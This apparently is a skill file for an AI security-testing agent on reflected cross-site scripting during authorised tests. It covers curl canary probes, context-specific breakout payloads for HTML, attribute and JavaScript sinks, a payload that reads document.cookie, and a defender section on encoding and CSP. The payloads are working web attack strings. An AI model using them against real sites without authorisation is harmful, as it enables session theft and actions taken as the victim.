---
name: xss-reflected
description: Use when testing for reflected cross-site scripting on an
  authorized engagement, where attacker input is echoed immediately in the
  response. Covers reflection mapping across parameters and contexts, context
  breakout payloads for HTML, attribute, and JavaScript sinks, and safe
  proof-of-concept design. Use when search boxes, error messages, URL
  parameters, or 404 pages echo input, when you need to classify the exact
  sink context, or when building a minimal alert-free PoC for the report.
version: 1.0.0
domain: web
lifecycle: stable
last_verified: 2026-10-23
parent: web-xss
requires: [web-xss]
extends: []
relates: [web-sqli, api-security-testing]
tools:
  - name: Burp Suite
    version: 2026.2
  - name: curl
    version: 8.5
  - name: Python
    version: 3.12
---

Reflected cross-site scripting happens when the application takes input from
the request and writes it straight back into the response without safe
encoding. The victim must be tricked into opening a crafted link, but the
impact is real: session theft, actions as the victim, and phishing inside a
trusted origin. This skill covers finding and proving reflected XSS on
authorized tests, including exact context classification and minimal
proof-of-concept payloads. Stored and DOM variants are separate sub-skills.

## Quick Workflow

1. Map inputs that reflect: URL parameters, search fields, error pages,
   headers reflected in debug output.
2. Inject a unique canary string (for example `xssprobe123`) and locate
   every reflection point in the raw response.
3. Classify each sink context: HTML body, double-quoted attribute,
   single-quoted attribute, JavaScript string, or JavaScript code.
4. Craft the minimal breakout payload for that exact context.
5. Prove execution with a harmless marker (console log or DOM change), not
   a noisy alert box on shared environments.
6. Test the payload as a full URL the victim would click, checking length
   and encoding survival.
7. Record the request, the reflection context, and the working PoC.

## 1. Reflection mapping

Find every place your input lands before choosing a payload.

```bash
# Canary probe across a parameter
curl -s 'https://target.example/search?q=xssprobe123' -o /tmp/refl.html
grep -o '.\{40\}xssprobe123.\{40\}' /tmp/refl.html

# Check several inputs at once with distinct canaries
curl -s 'https://target.example/search?q=AAA111&cat=BBB222&sort=CCC333' \
  | grep -o '.\{30\}\(AAA111\|BBB222\|CCC333\).\{30\}'

# POST reflection and error-page reflection
curl -s -X POST 'https://target.example/contact' \
  -d 'name=xssprobe123&msg=hi' | grep -o '.\{40\}xssprobe123.\{40\}'
curl -s 'https://target.example/nonexistent-xssprobe123' \
  | grep -o '.\{40\}xssprobe123.\{40\}'
```

Read 40 characters around each canary. The surrounding characters tell you
the context: `<p>CANARY</p>` is HTML body, `value="CANARY"` is an attribute,
`var q = 'CANARY';` is a JavaScript string.

## 2. Context breakout payloads

Match the payload to the context. One context, one payload, no guessing.

```bash
# HTML body context: <div>CANARY</div>
# Payload: <script>console.log('xss')</script>
# URL-encoded for the link:
python3 -c "import urllib.parse; print(urllib.parse.quote(\"<script>console.log('xss')</script>\"))"

# Double-quoted attribute: <input value="CANARY">
# Payload: "><script>console.log('xss')</script>
# Or event handler without leaving the tag:
# Payload: " autofocus onfocus=console.log('xss')

# Single-quoted attribute: <input value='CANARY'>
# Payload: '><script>console.log('xss')</script>

# JavaScript string: <script>var q = 'CANARY';</script>
# Payload: ';console.log('xss');//
# Or: '-console.log('xss')-'

# JavaScript code context (rare): var id = CANARY;
# Payload: console.log('xss');//
```

Verify each payload in a real browser, not just curl: encoding, browser
parsing quirks, and nested contexts only show at render time.

## 3. Safe proof of concept

Prove execution without harming anyone who might click the link during the
test.

```html
<!-- Minimal PoC page for the report: shows the payload fired -->
<script>
// Reflected payload used (HTML body context):
// <img src=x onerror="document.title='XSS-CONFIRMED'">
</script>
```

```bash
# Harmless execution marker: change the page title instead of alert()
# Payload: "><img src=x onerror=document.title='XSS-CONFIRMED'>
# Confirm by loading the URL in a test browser and reading document.title

# Cookie readability check (proves session theft potential, read-only)
# Payload: "><img src=x onerror=console.log(document.cookie)>
```

Never exfiltrate real session cookies to an external server during a
reflected XSS test unless the rules of engagement explicitly allow it.
Reading `document.cookie` in the console is enough proof.

## Edge cases

- The reflection is HTML-encoded once but decoded by a second sink.
  Trace the full path: stored procedures, JavaScript that writes
  `innerHTML`, and framework templates can decode what the server encoded.
- The canary appears in multiple contexts on one page. Exploit the weakest
  context and note the others; one working sink is enough for the finding.
- Input length limits cut the payload. Use short vectors like
  `<svg onload=console.log(1)>` (24 characters) instead of full script
  tags.
- The application reflects only after a redirect. Follow redirects with
  `curl -L` or test in the browser so you see the final reflection point.
- Quotes are stripped but angle brackets survive. Event-handler payloads
  need quotes for attributes; try backticks or unquoted attributes in
  older parsers.

## Escalation

- Every breakout is neutralized: the sink may be defended by output
  encoding you have not mapped. Re-check the exact bytes around the canary
  with `curl` and `xxd`; assumed encoding is the usual mistake.
- The reflection needs a POST or a specific header: build the PoC as an
  auto-submitting form page instead of a GET link, and note the higher
  interaction requirement in the report.
- You need a stronger impact demo: with permission, show a session-cookie
  read in the console and explain the theft scenario; do not build a real
  exfiltration channel without written approval.
- Reflected input lands in a script src or similar dangerous sink: treat
  it as high severity even without a working alert, and document the sink.

## Detection and defender view

Defenders see reflected XSS probes as requests carrying script tags, event
handlers, and canary strings, often followed by a browser fetch of the same
URL from the tester's IP. WAFs signature the common vectors, but context
breakouts vary too much to block reliably. The durable fix is
context-sensitive output encoding (HTML, attribute, and JavaScript
encoders used correctly per sink), plus Content Security Policy as a second
layer, never the only layer.

## Key references

- MITRE ATT&CK T1189 (Drive-by Compromise).
- CWE-79 (Improper Neutralization of Input During Web Page Generation,
  Cross-site Scripting).
- OWASP Testing Guide: Testing for Reflected Cross Site Scripting
  (OTG-INPVAL-001).
- PortSwigger Web Security Academy: Reflected XSS labs and cheat sheet.
